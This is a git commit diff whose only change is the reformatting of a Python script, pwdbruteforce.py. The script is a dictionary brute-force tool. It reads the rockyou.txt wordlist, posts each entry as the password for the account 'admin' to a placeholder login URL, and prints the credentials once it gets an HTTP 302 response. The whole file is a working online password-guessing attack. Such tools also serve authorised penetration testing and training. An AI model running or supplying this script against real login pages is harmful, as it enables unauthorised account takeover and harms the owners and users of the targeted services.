91e9f4561171e4fa917e80ede67254161b313a0e
platas.crypto <platas.crypto@gmail.com>
2022-09-27 11:07:19 +0200

    File formated

--- pwdbruteforce/pwdbruteforce.py
+++ pwdbruteforce/pwdbruteforce.py
@@ -8,41 +8,38 @@ from tqdm import tqdm
 login_url = "http://your-domain.com/login"
 dictionary_path = "/usr/share/wordlists/rockyou.txt"
 
+# Progress bar
 pbar = None
 
+
 def exit_handler(sig, frame):
-	pbar.close()
-	print('\n\nExiting program...')
-	sys.exit(1)
-	
+    pbar.close()
+    print('\n\nExiting program...')
+    sys.exit(1)
+
+
 # When user exists with Ctrl + C
-signal.signal(signal.SIGINT, exit_handler)	
+signal.signal(signal.SIGINT, exit_handler)
+
 
 def bruteForcePassword():
-
-	with open(dictionary_path, 'r') as file:	
-
-		global pbar 
-
-		pbar = tqdm(file.readlines(), desc='Brute Forcing')
-
-		for passw in pbar:
-
-			post_data = {
-				'email': 'admin',
-				'password': passw
-			}
-
-			r = requests.post(login_url, data=post_data, allow_redirects=False)
-
-			# when password found
-			if r.status_code == 302:# update with success status code or change in request parameter
-				pbar.close()
-				print('\n[!] Password found! \nCredentials: %s:%s' % (post_data['email'],post_data['password']))
-				sys.exit(0)
-
-		print('\nNo passwords found.')
+    with open(dictionary_path, 'r') as file:
+        global pbar
+        pbar = tqdm(file.readlines(), desc='Brute Forcing')
+        for passw in pbar:
+            post_data = {
+                'email': 'admin',
+                'password': passw
+            }
+            r = requests.post(login_url, data=post_data, allow_redirects=False)
+            # when password found
+            if r.status_code == 302:  # update with success status code or change in request parameter
+                pbar.close()
+                print('\n[!] Password found! \nCredentials: %s:%s' %
+                      (post_data['email'], post_data['password']))
+                sys.exit(0)
+        print('\nNo passwords found.')
 
 
 if __name__ == '__main__':
-	bruteForcePassword()
+    bruteForcePassword()
